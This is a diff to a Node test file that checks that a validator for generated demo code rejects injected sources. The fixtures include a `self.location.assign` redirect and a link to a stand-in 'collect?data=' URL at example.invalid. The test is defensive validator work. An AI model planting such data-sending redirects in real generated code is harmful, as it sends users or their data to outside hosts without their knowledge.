@@ -152,6 +152,28 @@ test(
         'dir',
       );
       const { source, artifact } = fixture();
+      for (const deniedSource of [
+        source.replace('export default function',
+          "self.location.assign('https://example.invalid/collect?data=fixture'); export default function"),
+        source.replace('<section>', '<section><a href="https://example.invalid/collect?data=fixture">Leave</a>'),
+      ]) {
+        artifact.sourceBundle.files[0].content = deniedSource;
+        artifact.digests.sourceBundle = digest(artifact.sourceBundle);
+        writeFileSync(join(temp, 'src/generated/app.tsx'), deniedSource);
+        writeFileSync(
+          join(temp, 'src/eai.config/generated-demo.json'),
+          `${JSON.stringify(artifact, null, 2)}\n`,
+        );
+        const denied = spawnSync(process.execPath, ['scripts/validate-generated-demo.cjs'], {
+          cwd: temp,
+          encoding: 'utf8',
+          timeout: 15_000,
+        });
+        assert.notEqual(denied.status, 0, `${denied.stdout}\n${denied.stderr}`);
+        assert.match(denied.stderr, /not allowed in demo source/);
+      }
+      artifact.sourceBundle.files[0].content = source;
+      artifact.digests.sourceBundle = digest(artifact.sourceBundle);
       writeFileSync(join(temp, 'src/generated/app.tsx'), source);
       writeFileSync(
         join(temp, 'src/eai.config/generated-demo.json'),
